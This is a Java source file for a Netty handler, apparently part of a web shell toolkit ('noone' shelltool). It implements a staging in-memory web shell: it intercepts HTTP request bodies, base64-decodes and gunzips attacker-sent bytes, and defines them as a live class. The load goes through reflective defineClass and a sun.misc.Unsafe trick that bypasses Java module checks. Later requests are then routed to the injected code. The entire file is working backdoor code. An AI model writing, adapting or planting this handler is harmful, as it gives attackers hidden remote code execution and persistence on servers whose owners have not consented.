package com.reajason.noone.core.shelltool;

import io.netty.buffer.CompositeByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.*;
import io.netty.util.ReferenceCountUtil;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;

@ChannelHandler.Sharable
public class NoOneStagingNettyHandler extends ChannelDuplexHandler {
    private static volatile Class<?> adaptorClass;
    private HttpRequest currentRequest;
    private CompositeByteBuf accumulated;
    private List<Object> pendingMessages;
    private boolean buffering;

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (!(msg instanceof HttpRequest) && !(msg instanceof HttpContent)) {
            ctx.fireChannelRead(msg);
            return;
        }

        if (msg instanceof HttpRequest) {
            HttpRequest request = (HttpRequest) msg;
            if (!shouldBufferRequest(request)) {
                ctx.fireChannelRead(msg);
                return;
            }
            currentRequest = request;
            pendingMessages = new ArrayList<>();
            pendingMessages.add(msg);
            buffering = true;
        }

        if (!(msg instanceof HttpContent)) {
            return;
        }
        if (!buffering) {
            ctx.fireChannelRead(msg);
            return;
        }
        if (!(msg instanceof HttpRequest)) {
            pendingMessages.add(msg);
        }

        HttpContent httpContent = (HttpContent) msg;
        if (accumulated == null) {
            accumulated = ctx.alloc().compositeBuffer();
        }
        accumulated.addComponent(true, httpContent.content().retain());

        if (!(httpContent instanceof LastHttpContent)) {
            return;
        }

        byte[] bytes = readAccumulatedBytes();
        if (adaptorClass != null) {
            if (tryInvokeAdaptor(ctx, bytes)) {
                releasePendingMessages();
                resetState();
                return;
            }
        } else if (tryLoadAdaptor(ctx, bytes)) {
            releasePendingMessages();
            resetState();
            return;
        }

        replayPendingMessages(ctx);
        resetState();
    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
        releasePendingMessages();
        resetState();
        super.channelInactive(ctx);
    }

    @Override
    public void channelReadComplete(ChannelHandlerContext ctx) throws Exception {
        if (buffering) {
            ctx.read();
        }
        super.channelReadComplete(ctx);
    }

    private boolean tryInvokeAdaptor(ChannelHandlerContext ctx, byte[] bytes) {
        try {
            return adaptorClass != null && adaptorClass.newInstance().equals(new Object[]{ctx, currentRequest, bytes});
        } catch (Throwable e) {
            return false;
        }
    }

    private boolean tryLoadAdaptor(ChannelHandlerContext ctx, byte[] bytes) {
        try {
            if (adaptorClass == null) {
                synchronized (NoOneStagingNettyHandler.class) {
                    if (adaptorClass == null) {
                        byte[] payload = transformReqPayload(getArgFromContent(bytes));
                        byte[] classBytes = gzipDecompress(decodeBase64(new String(payload, "UTF-8")));
                        adaptorClass = reflectionDefineClass(classBytes);
                    }
                }
            }
            FullHttpResponse response = new DefaultFullHttpResponse(
                    HttpVersion.HTTP_1_1,
                    HttpResponseStatus.OK,
                    Unpooled.wrappedBuffer(wrapResData(transformResData("ok".getBytes("UTF-8"))))
            );
            response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
            response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
            wrapResponse(response);
            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
            return true;
        } catch (Throwable e) {
            try {
                FullHttpResponse response = new DefaultFullHttpResponse(
                        HttpVersion.HTTP_1_1,
                        HttpResponseStatus.OK,
                        Unpooled.wrappedBuffer(getStackTraceAsString(e).getBytes("UTF-8"))
                );
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
                wrapResponse(response);
                ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
            } catch (Throwable ignored) {
            }
            return true;
        }
    }

    private boolean shouldBufferRequest(HttpRequest request) {
        if (adaptorClass == null) {
            return isAuthed(request);
        }
        try {
            return adaptorClass.newInstance().equals(new Object[]{request});
        } catch (Throwable e) {
            return false;
        }
    }

    private byte[] readAccumulatedBytes() {
        byte[] bytes = new byte[accumulated.readableBytes()];
        accumulated.getBytes(accumulated.readerIndex(), bytes);
        return bytes;
    }

    private void replayPendingMessages(ChannelHandlerContext ctx) {
        if (pendingMessages == null) {
            return;
        }
        for (Object pendingMessage : pendingMessages) {
            ctx.fireChannelRead(pendingMessage);
        }
        pendingMessages = null;
    }

    private void releasePendingMessages() {
        if (pendingMessages == null) {
            return;
        }
        for (Object pendingMessage : pendingMessages) {
            ReferenceCountUtil.release(pendingMessage);
        }
        pendingMessages = null;
    }

    private void resetState() {
        if (accumulated != null) {
            accumulated.release();
            accumulated = null;
        }
        currentRequest = null;
        buffering = false;
        pendingMessages = null;
    }

    private boolean isAuthed(HttpRequest request) {
        return true;
    }

    private byte[] getArgFromContent(byte[] content) {
        return null;
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(FullHttpResponse response) {
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }

    @SuppressWarnings("all")
    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        if (getAndSetObjectM != null) {
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
        }
        return clazz;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }
}
